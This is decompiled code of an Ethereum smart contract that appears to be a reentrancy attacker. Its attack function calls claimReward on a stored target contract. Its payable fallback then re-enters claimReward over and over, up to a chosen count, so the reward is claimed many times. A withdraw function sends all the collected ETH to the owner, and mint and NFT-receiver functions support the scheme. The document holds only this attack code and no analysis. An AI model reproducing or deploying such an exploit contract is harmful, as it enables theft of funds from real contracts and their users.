contract main {




// =====================  Runtime code  =====================


address stor0;
address stor1;
uint256 stor2;
uint256 stor3;
uint256 stor4;

function withdraw() {
    require msg.sender == stor0
    call msg.sender with:
       value eth.balance(this.address) wei
         gas gas_remaining wei
}

function _fallback() payable {
    if stor2 <= stor3:
        stor2++
        require ext_code.size(stor1)
        call stor1.claimReward(uint256 arg1) with:
             gas gas_remaining wei
            args stor4
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
}

function mint(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require ext_code.size(stor1)
    call stor1.0xa0712d68 with:
       value msg.value wei
         gas gas_remaining wei
        args arg1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function onERC721Received(address arg1, uint256 arg2, bytes arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 <= test266151307()
    require arg3 + 35 < calldata.size
    require arg3.length <= test266151307()
    require arg3 + arg3.length + 36 <= calldata.size
    return 0xf0b9e5ba00000000000000000000000000000000000000000000000000000000
}

function attack(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    stor4 = arg1
    stor2 = 1
    stor3 = arg2
    require ext_code.size(stor1)
    call stor1.claimReward(uint256 arg1) with:
         gas gas_remaining wei
        args arg1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
